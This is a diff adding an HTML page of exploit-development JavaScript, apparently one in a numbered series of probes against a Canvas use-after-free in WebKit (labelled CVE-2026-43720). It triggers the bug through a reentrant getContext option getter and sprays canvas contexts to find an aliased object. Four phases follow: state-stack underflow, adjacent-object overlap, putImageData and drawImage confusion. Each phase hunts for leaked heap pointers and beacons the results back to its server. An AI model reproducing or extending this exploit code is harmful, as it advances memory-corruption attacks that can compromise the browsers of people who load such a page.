@@ -1,0 +1,434 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635f</title></head>
+<body><pre id="out">p635f: Canvas UAF — state stack confusion + adjacent context</pre>
+<script>
+'use strict';
+/*
+  p635f: CVE-2026-43720 — save/restore stack desync + adjacent context field probing
+  -- prior art: p635e confirmed 13 doubles + 8 strings, double UAF adjacent gap=1
+  -- prior art: NaN/Inf sanitized to identity, gradient/pattern opaque, pixels clean
+
+  CRASH_CLASS: HIGH — state stack manipulation on UAF context
+
+  Strategy:
+  A) save()/restore() stack desync: save N times through alias, restore N+1 through
+     inner. If the internal state stack pointer is corrupted, restore may read
+     from out-of-bounds stack memory, exposing heap pointers as field values.
+  B) Adjacent context overlap: trigger 2 UAFs, verify spray[N] and spray[N+1].
+     Write extreme doubles through ctx1, read ctx2's fields — if Canvas2D objects
+     are allocated contiguously, large values in ctx1's tail fields may overlap
+     ctx2's header fields (where vtable/refcount/canvas pointer live).
+  C) putImageData confusion: write pixel data through alias onto inner's canvas,
+     then read back — if backing buffers differ, may expose stale data.
+  D) drawImage self-reference: use alias canvas as source for drawImage on inner —
+     forces WebKit to read from one backing while writing to another through the
+     same object. May expose internal buffer pointers through rendering artifacts.
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635F-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635f', msg:msg, level:'info', sid:'p635f-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+bk('START', navigator.userAgent);
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(v) {
+  if (typeof v !== 'number' || v !== v) return false;
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var hi = new Uint32Array(buf)[1];
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF);
+}
+
+function triggerUAF() {
+  var inner = null;
+  var cv = document.createElement('canvas');
+  cv.width = 64; cv.height = 64;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  try { cv.getContext('bitmaprenderer', opts); } catch(e) {}
+  return {inner: inner, canvas: cv};
+}
+
+var tc = document.createElement('canvas');
+if (!tc.getContext('bitmaprenderer')) { bk('DEAD', 'no bmr'); throw new Error('no bmr'); }
+bk('P0', 'bmr OK');
+tc = null;
+
+// ================================================================
+// PHASE A: save/restore state stack desync
+// ================================================================
+bk('A-START', 'state stack desync');
+var uafA = triggerUAF();
+if (!uafA.inner) {
+  bk('A-FAIL', 'no inner');
+} else {
+  var sprayA = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayA.push(ctx);
+  }
+  var SENTA = 5555.25;
+  try { uafA.inner.lineWidth = SENTA; } catch(e) {}
+  var aliasA = -1;
+  for (var i = 0; i < sprayA.length; i++) {
+    if (sprayA[i].lineWidth === SENTA) { aliasA = i; break; }
+  }
+  bk('A-ALIAS', aliasA >= 0 ? 'spray[' + aliasA + ']' : 'NONE');
+
+  if (aliasA >= 0) {
+    var af = sprayA[aliasA];
+
+    // Set known values
+    af.lineWidth = 100;
+    af.miterLimit = 200;
+    af.globalAlpha = 0.75;
+
+    // save() through alias — pushes current state onto stack
+    af.save();
+    af.save();
+    af.save();
+    bk('A-SAVED', '3x through alias');
+
+    // Change values through inner
+    uafA.inner.lineWidth = 999;
+    uafA.inner.miterLimit = 888;
+
+    // restore() through inner — pops from the SAME stack
+    // Each restore should bring back the saved values
+    try {
+      uafA.inner.restore();
+      var r1 = {lw: uafA.inner.lineWidth, ml: uafA.inner.miterLimit, ga: uafA.inner.globalAlpha};
+      bk('A-R1', JSON.stringify(r1));
+    } catch(e) { bk('A-R1', 'ERR:' + e.message.slice(0,40)); }
+
+    try {
+      uafA.inner.restore();
+      var r2 = {lw: uafA.inner.lineWidth, ml: uafA.inner.miterLimit, ga: uafA.inner.globalAlpha};
+      bk('A-R2', JSON.stringify(r2));
+    } catch(e) { bk('A-R2', 'ERR:' + e.message.slice(0,40)); }
+
+    try {
+      uafA.inner.restore();
+      var r3 = {lw: uafA.inner.lineWidth, ml: uafA.inner.miterLimit, ga: uafA.inner.globalAlpha};
+      bk('A-R3', JSON.stringify(r3));
+    } catch(e) { bk('A-R3', 'ERR:' + e.message.slice(0,40)); }
+
+    // Now try ONE MORE restore than we saved — stack underflow
+    try {
+      uafA.inner.restore();
+      var r4 = {lw: uafA.inner.lineWidth, ml: uafA.inner.miterLimit, ga: uafA.inner.globalAlpha};
+      bk('A-R4-UNDERFLOW', JSON.stringify(r4));
+      // Check for pointer-like values
+      if (isPointerLike(r4.lw)) bk('A-PTR', 'lw=' + f64hex(r4.lw));
+      if (isPointerLike(r4.ml)) bk('A-PTR', 'ml=' + f64hex(r4.ml));
+    } catch(e) { bk('A-R4-UNDERFLOW', 'ERR:' + e.message.slice(0,40)); }
+
+    // Deep save/restore: save 50 times through alias with unique values each time
+    for (var i = 0; i < 50; i++) {
+      af.lineWidth = 10000 + i;
+      af.save();
+    }
+    bk('A-DEEP-SAVED', '50x');
+
+    // Read lineWidth at different restore depths through inner
+    var deepDump = [];
+    for (var i = 0; i < 55; i++) {
+      try {
+        uafA.inner.restore();
+        var lw = uafA.inner.lineWidth;
+        if (lw < 10000 || lw >= 10050) {
+          // Unexpected value!
+          deepDump.push('r' + i + '=' + f64hex(lw) + '(' + lw + ')');
+          if (isPointerLike(lw)) deepDump.push('PTR!');
+        }
+      } catch(e) {
+        deepDump.push('r' + i + '=ERR');
+        break;
+      }
+    }
+    bk('A-DEEP', deepDump.length > 0 ? deepDump.join(' ') : 'all expected (10049..10000 then default)');
+
+    // Check final hex dump
+    try {
+      var txFinal = uafA.inner.getTransform();
+      bk('A-FINAL-TX', 'a=' + f64hex(txFinal.a) + ' b=' + f64hex(txFinal.b));
+    } catch(e) {}
+  }
+}
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: Adjacent context overlap
+// Two UAFs -> spray -> verify adjacent -> write extreme values through ctx1,
+// read ctx2 to look for leaked internal pointers from ctx1's tail
+// ================================================================
+bk('B-START', 'adjacent context overlap');
+var uaf1 = triggerUAF();
+var uaf2 = triggerUAF();
+if (!uaf1.inner || !uaf2.inner) {
+  bk('B-FAIL', 'inner1=' + !!uaf1.inner + ' inner2=' + !!uaf2.inner);
+} else {
+  var sprayB = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayB.push(ctx);
+  }
+
+  var S1 = 1234.5;
+  try { uaf1.inner.lineWidth = S1; } catch(e) {}
+  var a1 = -1;
+  for (var i = 0; i < sprayB.length; i++) {
+    if (sprayB[i].lineWidth === S1) { a1 = i; break; }
+  }
+
+  var S2 = 5678.5;
+  try { uaf2.inner.lineWidth = S2; } catch(e) {}
+  var a2 = -1;
+  for (var i = 0; i < sprayB.length; i++) {
+    if (sprayB[i].lineWidth === S2) { a2 = i; break; }
+  }
+
+  bk('B-ALIASES', 'inner1=spray[' + a1 + '] inner2=spray[' + a2 + '] gap=' + Math.abs(a2 - a1));
+
+  if (a1 >= 0 && a2 >= 0 && a1 !== a2) {
+    // Determine which is lower (earlier in memory)
+    var lo = a1 < a2 ? a1 : a2;
+    var hi = a1 < a2 ? a2 : a1;
+    var loInner = a1 < a2 ? uaf1.inner : uaf2.inner;
+    var hiInner = a1 < a2 ? uaf2.inner : uaf1.inner;
+    var loCtx = sprayB[lo];
+    var hiCtx = sprayB[hi];
+
+    // Record default values of hi context BEFORE any writes
+    var hiDefaults = {};
+    try { hiDefaults.lw = hiInner.lineWidth; } catch(e) {}
+    try { hiDefaults.ml = hiInner.miterLimit; } catch(e) {}
+    try { hiDefaults.ga = hiInner.globalAlpha; } catch(e) {}
+    try { hiDefaults.sb = hiInner.shadowBlur; } catch(e) {}
+    try {
+      var txH = hiInner.getTransform();
+      hiDefaults.txa = txH.a; hiDefaults.txb = txH.b;
+    } catch(e) {}
+    bk('B-HI-BEFORE', JSON.stringify(hiDefaults));
+
+    // Write EXTREME values to ALL fields of lo context
+    // Use very large doubles that would look distinctive if they bleed into adjacent memory
+    loInner.setTransform(1e300, 2e300, 3e300, 4e300, 5e300, 6e300);
+    loInner.lineWidth = 1e308;
+    loInner.miterLimit = 1.5e308;
+    loInner.globalAlpha = 1.0; // clamped to [0,1]
+    loInner.shadowBlur = 1e100;
+    loInner.shadowOffsetX = 2e100;
+    loInner.shadowOffsetY = 3e100;
+    loInner.lineDashOffset = 4e100;
+
+    // Deep save to push internal state stack allocation
+    for (var i = 0; i < 100; i++) {
+      loInner.save();
+    }
+    bk('B-LO-EXTREME', 'wrote extreme doubles + 100 saves');
+
+    // Now read ALL fields of hi context — any changes from defaults = overlap!
+    var hiAfter = {};
+    try { hiAfter.lw = hiInner.lineWidth; } catch(e) { hiAfter.lw = 'E'; }
+    try { hiAfter.ml = hiInner.miterLimit; } catch(e) { hiAfter.ml = 'E'; }
+    try { hiAfter.ga = hiInner.globalAlpha; } catch(e) { hiAfter.ga = 'E'; }
+    try { hiAfter.sb = hiInner.shadowBlur; } catch(e) { hiAfter.sb = 'E'; }
+    try { hiAfter.sox = hiInner.shadowOffsetX; } catch(e) { hiAfter.sox = 'E'; }
+    try { hiAfter.soy = hiInner.shadowOffsetY; } catch(e) { hiAfter.soy = 'E'; }
+    try { hiAfter.ldo = hiInner.lineDashOffset; } catch(e) { hiAfter.ldo = 'E'; }
+    try {
+      var txH2 = hiInner.getTransform();
+      hiAfter.txa = txH2.a; hiAfter.txb = txH2.b;
+      hiAfter.txc = txH2.c; hiAfter.txd = txH2.d;
+    } catch(e) { hiAfter.tx = 'E'; }
+    bk('B-HI-AFTER', JSON.stringify(hiAfter));
+
+    // Check for changes
+    var changed = [];
+    if (hiAfter.lw !== hiDefaults.lw) changed.push('lw:' + hiDefaults.lw + '->' + hiAfter.lw);
+    if (hiAfter.ml !== hiDefaults.ml) changed.push('ml:' + hiDefaults.ml + '->' + hiAfter.ml);
+    if (hiAfter.txa !== hiDefaults.txa) changed.push('txa:' + f64hex(hiAfter.txa));
+    if (hiAfter.txb !== hiDefaults.txb) changed.push('txb:' + f64hex(hiAfter.txb));
+    bk('B-CHANGES', changed.length > 0 ? changed.join(' ') : 'NONE (no overlap)');
+
+    // Check for pointer-like values in hi
+    var ptrFields = ['lw','ml','ga','sb','sox','soy','ldo','txa','txb','txc','txd'];
+    for (var i = 0; i < ptrFields.length; i++) {
+      var v = hiAfter[ptrFields[i]];
+      if (typeof v === 'number' && isPointerLike(v)) {
+        bk('B-PTR', ptrFields[i] + '=' + f64hex(v) + ' POINTER-LIKE');
+      }
+    }
+
+    // Hex dump of hi context
+    var hexDump = [];
+    for (var i = 0; i < ptrFields.length; i++) {
+      var v = hiAfter[ptrFields[i]];
+      if (typeof v === 'number') hexDump.push(ptrFields[i] + '=' + f64hex(v));
+    }
+    bk('B-HEX', hexDump.join(' '));
+  }
+}
+bk('B-DONE', 'survived');
+
+// ================================================================
+// PHASE C: putImageData confusion
+// Write specific byte patterns via putImageData on alias canvas,
+// read back through inner context — look for buffer confusion
+// ================================================================
+bk('C-START', 'putImageData confusion');
+var uafC = triggerUAF();
+if (!uafC.inner) {
+  bk('C-FAIL', 'no inner');
+} else {
+  var sprayC = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayC.push({ctx: ctx, canvas: c});
+  }
+  var SENTC = 7777.5;
+  try { uafC.inner.lineWidth = SENTC; } catch(e) {}
+  var aliasC = -1;
+  for (var i = 0; i < sprayC.length; i++) {
+    if (sprayC[i].ctx.lineWidth === SENTC) { aliasC = i; break; }
+  }
+  bk('C-ALIAS', aliasC >= 0 ? 'spray[' + aliasC + ']' : 'NONE');
+
+  if (aliasC >= 0) {
+    var ac = sprayC[aliasC];
+    // Create ImageData with known pattern
+    try {
+      var imgd = new ImageData(64, 64);
+      for (var i = 0; i < imgd.data.length; i += 4) {
+        imgd.data[i] = 0xDE;
+        imgd.data[i+1] = 0xAD;
+        imgd.data[i+2] = 0xBE;
+        imgd.data[i+3] = 0xEF;
+      }
+      // Put through alias
+      ac.ctx.putImageData(imgd, 0, 0);
+      bk('C-PUT', 'alias putImageData 64x64 DEADBEEF');
+
+      // Read through inner
+      var readback = uafC.inner.getImageData(0, 0, 64, 64);
+      var mismatch = 0;
+      var firstMismatch = '';
+      for (var i = 0; i < readback.data.length; i += 4) {
+        if (readback.data[i] !== 0xDE || readback.data[i+1] !== 0xAD ||
+            readback.data[i+2] !== 0xBE || readback.data[i+3] !== 0xEF) {
+          mismatch++;
+          if (!firstMismatch) {
+            firstMismatch = 'px[' + (i/4) + ']=' +
+              readback.data[i] + ',' + readback.data[i+1] + ',' +
+              readback.data[i+2] + ',' + readback.data[i+3];
+          }
+        }
+      }
+      bk('C-READ', 'mismatch=' + mismatch + '/' + (readback.data.length/4) +
+         (firstMismatch ? ' first=' + firstMismatch : ''));
+    } catch(e) {
+      bk('C-ERR', e.message.slice(0,60));
+    }
+  }
+}
+bk('C-DONE', 'survived');
+
+// ================================================================
+// PHASE D: drawImage self-reference
+// Use alias canvas as source for drawImage on inner, scaled up
+// ================================================================
+bk('D-START', 'drawImage self-ref');
+var uafD = triggerUAF();
+if (!uafD.inner) {
+  bk('D-FAIL', 'no inner');
+} else {
+  var sprayD = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayD.push({ctx: ctx, canvas: c});
+  }
+  var SENTD = 3333.5;
+  try { uafD.inner.lineWidth = SENTD; } catch(e) {}
+  var aliasD = -1;
+  for (var i = 0; i < sprayD.length; i++) {
+    if (sprayD[i].ctx.lineWidth === SENTD) { aliasD = i; break; }
+  }
+  bk('D-ALIAS', aliasD >= 0 ? 'spray[' + aliasD + ']' : 'NONE');
+
+  if (aliasD >= 0) {
+    var ad = sprayD[aliasD];
+    // Draw a pattern on alias canvas
+    ad.ctx.fillStyle = '#ff0000';
+    ad.ctx.fillRect(0, 0, 64, 64);
+    ad.ctx.fillStyle = '#00ff00';
+    ad.ctx.fillRect(16, 16, 32, 32);
+
+    // drawImage alias canvas onto inner canvas (UAF canvas is 64x64)
+    try {
+      uafD.inner.drawImage(ad.canvas, 0, 0);
+      bk('D-DRAW', 'drawn alias onto inner canvas');
+
+      // Read pixels from inner canvas
+      var px = uafD.inner.getImageData(0, 0, 64, 64);
+      // Check corner (should be red) and center (should be green)
+      bk('D-CORNER', px.data[0] + ',' + px.data[1] + ',' + px.data[2] + ',' + px.data[3]);
+      var mid = (32 * 64 + 32) * 4;
+      bk('D-CENTER', px.data[mid] + ',' + px.data[mid+1] + ',' + px.data[mid+2] + ',' + px.data[mid+3]);
+
+      // Now try drawing inner canvas onto alias canvas (self-reference through UAF)
+      ad.ctx.drawImage(uafD.canvas, 0, 0);
+      bk('D-SELF-REF', 'drawn inner onto alias');
+
+      // Check for anomalies in any uninitialized regions
+      var px2 = ad.ctx.getImageData(0, 0, 64, 64);
+      var nonPattern = 0;
+      for (var i = 0; i < px2.data.length; i += 4) {
+        var r = px2.data[i], g = px2.data[i+1], b = px2.data[i+2];
+        if (!((r === 255 && g === 0 && b === 0) || (r === 0 && g === 255 && b === 0) || (r === 0 && g === 0 && b === 0))) {
+          nonPattern++;
+        }
+      }
+      bk('D-ANOMALY', nonPattern + ' non-pattern pixels');
+    } catch(e) {
+      bk('D-ERR', e.message.slice(0,60));
+    }
+  }
+}
+bk('D-DONE', 'survived');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
